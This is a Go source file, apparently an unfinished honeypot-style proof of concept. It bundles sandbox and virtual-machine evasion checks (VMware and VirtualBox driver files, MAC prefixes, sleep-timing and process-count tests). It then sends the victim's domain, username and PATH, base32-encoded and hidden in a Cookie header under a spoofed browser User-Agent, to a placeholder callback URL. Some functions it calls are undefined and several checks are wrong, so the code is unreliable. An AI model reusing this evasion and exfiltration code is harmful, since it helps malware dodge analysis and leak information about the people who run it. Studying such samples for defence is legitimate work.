// Massive Work in Progress -Built off the back of AutoPoC and HoneyPoC projects
// Eventual plan is to have a reverse blacklist of various paths, users and hostnames, if the data matches then run the code, else no hax
// ZephrFish 2022
// v0.3
// Additional Sandbox checks added in following structure
// Modify line 208 to your callback host

package main

import (
	"encoding/base32"
	"encoding/binary"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"os"
	"runtime"
	"strings"
	"time"

	ps "github.com/mitchellh/go-ps"
)

// To update with paths from HoneyPoC too
func S_SpyFilepath() bool {
	EvidenceOfS_Spy := make([]string, 0)
	FilePathsToCheck := [...]string{`C:\windows\System32\Drivers\Vmmouse.sys`,
		`C:\windows\System32\Drivers\vm3dgl.dll`, `C:\windows\System32\Drivers\vmdum.dll`,
		`C:\windows\System32\Drivers\vm3dver.dll`, `C:\windows\System32\Drivers\vmtray.dll`,
		`C:\windows\System32\Drivers\vmci.sys`, `C:\windows\System32\Drivers\vmusbmouse.sys`,
		`C:\windows\System32\Drivers\vmx_svga.sys`, `C:\windows\System32\Drivers\vmxnet.sys`,
		`C:\windows\System32\Drivers\VMToolsHook.dll`, `C:\windows\System32\Drivers\vmhgfs.dll`,
		`C:\windows\System32\Drivers\vmmousever.dll`, `C:\windows\System32\Drivers\vmGuestLib.dll`,
		`C:\windows\System32\Drivers\VmGuestLibJava.dll`, `C:\windows\System32\Drivers\vmscsi.sys`,
		`C:\windows\System32\Drivers\VBoxMouse.sys`, `C:\windows\System32\Drivers\VBoxGuest.sys`,
		`C:\windows\System32\Drivers\VBoxSF.sys`, `C:\windows\System32\Drivers\VBoxVideo.sys`,
		`C:\windows\System32\vboxdisp.dll`, `C:\windows\System32\vboxhook.dll`,
		`C:\windows\System32\vboxmrxnp.dll`, `C:\windows\System32\vboxogl.dll`,
		`C:\windows\System32\vboxoglarrayspu.dll`, `C:\windows\System32\vboxoglcrutil.dll`,
		`C:\windows\System32\vboxoglerrorspu.dll`, `C:\windows\System32\vboxoglfeedbackspu.dll`,
		`C:\windows\System32\vboxoglpackspu.dll`, `C:\windows\System32\vboxoglpassthroughspu.dll`,
		`C:\windows\System32\vboxservice.exe`, `C:\windows\System32\vboxtray.exe`,
		`C:\windows\System32\VBoxControl.exe`}
	for _, FilePath := range FilePathsToCheck {
		if _, err := os.Stat(FilePath); err == nil {
			EvidenceOfS_Spy = append(EvidenceOfS_Spy, FilePath)
		}
	}
	if len(EvidenceOfS_Spy) == 0 {
		return false
	} else {
		return true
	}
}

// Function is a work in progress, still gathering data from VT and other S_Spyes via Canaries
func S_SpyHostname() bool {
	S_SpyHostnameEvidence := make([]string, 0)
	HostnamesToCheck := [...]string{`WIN-VUA6POUV5UP`, `work`, `USER-PC`}
	for _, HostnameToCheck := range HostnamesToCheck {
		if _, err := os.Stat(HostnameToCheck); err == nil {
			S_SpyHostnameEvidence = append(S_SpyHostnameEvidence, HostnameToCheck)
		}
	}

	if len(S_SpyHostnameEvidence) == 0 {
		return false
	} else {
		return true
	}
}

// Function is a work in progress, still gathering data from VT and other S_Spyes via Canaries same as above function
func S_SpyUserName() bool {
	S_SpyUserEvidence := make([]string, 0)
	UsersToCheck := [...]string{`WIN-VUA6POUV5UP`, `work`}
	for _, Users := range UsersToCheck {
		if _, err := os.Stat(Users); err == nil {
			S_SpyUserEvidence = append(S_SpyUserEvidence, Users)
		}
	}

	if len(S_SpyUserEvidence) == 0 {
		return false
	} else {
		return true
	}
}

// Check S_Spy temp folder, else exit
func S_SpyTmp(entries int) bool {
	tmp_dir := `C:\windows\temp`
	files, err := ioutil.ReadDir(tmp_dir)
	if err != nil {
		return true
	}

	return len(files) < entries
}

// S_SpyUtc is used to check if the environment is in a properly set Utc timezone.
func S_SpyUtc() bool {
	_, offset := time.Now().Zone()

	return offset == 0
}

// S_SpyProcnum is used to check if the environment has processes less than a given integer.
func S_SpyProcnum(proc_num int) bool {
	processes, err := ps.Processes()
	if err != nil {
		return true
	}

	return len(processes) < proc_num
}

// S_SpySleep is used to check if the virtualized environment is speeding up the sleeping process.
func S_SpySleep() bool {
	z := false
	firstTime := getNTPTime()
	sleepSeconds := 10
	time.Sleep(time.Duration(sleepSeconds*1000) * time.Millisecond)
	secondTime := getNTPTime()
	difference := secondTime.Sub(firstTime).Seconds()
	if difference < float64(sleepSeconds) {
		z = true
	}
	return z
}

// S_SpyMac is used to check if the environment's MAC address matches standard MAC adddresses of virtualized environments.
func S_SpyMac() bool {
	hits := 0
	S_Spy_macs := []string{`00:0C:29`, `00:1C:14`,
		`00:50:56`, `00:05:69`, `08:00:27`}
	ifaces, _ := net.Interfaces()

	for _, iface := range ifaces {
		for _, mac := range S_Spy_macs {
			if strings.Contains(strings.ToLower(iface.HardwareAddr.String()), strings.ToLower(mac)) {
				hits += 1
			}
		}
	}

	return hits == 0
}

// S_SpyCpu is used to check if the environment's
// cores are less than a given integer.
func S_SpyCpu(cores int) bool {
	x := false
	num_procs := runtime.NumCPU()
	if !(num_procs >= cores) {
		x = true
	}
	return x
}

// S_SpyAll is used to check if an environment is virtualized by testing all S_Spy checks.
func S_SpyAll() bool {
	values := []bool{
		S_SpyFilepath(),
		S_SpySleep(),
		S_SpyTmp(100),
		S_SpyRam(2048),
		S_SpyMac(),
		S_SpyUtc(),
		S_SpyHostname(),
		S_SpyUserName(),
	}

	for s := range values {
		x := values[s]
		if x {
			return true
		}
	}

	return false
}

// Execution check
func SandExecBlock() bool {
	values := []bool{
		S_SpyHostname(),
		S_SpyUserName(),
	}

	for Check := range values {
		S_SpyExec := values[Check]
		if S_SpyExec {
			return true
		}
	}

	return false
}

func main() {

	client := &http.Client{}

	// Update this to match whatever callback URL we decide on
	CallBack := "CHANGEME"

	var envDomain string = os.Getenv("USERDOMAIN")
	var envUsername string = os.Getenv("USERNAME")
	var envPath string = os.Getenv("PATH")
	// TGTIP := os.Args[2]
	// TGT := string(TGTIP)
	// TargetIPPre := strings.Replace(TGT, "\r", "", -1)
	// TargetIP := strings.Replace(TargetIPPre, "\r", "", -1)

	data := []byte(string(" Domain\n: " + envDomain + " Username\n: " + envUsername + " Path\n " + envPath))
	str := base32.StdEncoding.EncodeToString(data)

	req, err := http.NewRequest("GET", CallBack, nil)
	if err != nil {
		log.Fatalln(err)
	}

	// We can change this to whatever we want
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36")
	req.Header.Set("Cookie", str)
	// req.Header.Set("X-Target-IP", TargetIP)

	resp, err := client.Do(req)

	if err != nil {
		log.Fatalln(err)
		fmt.Println(resp)
	}

}
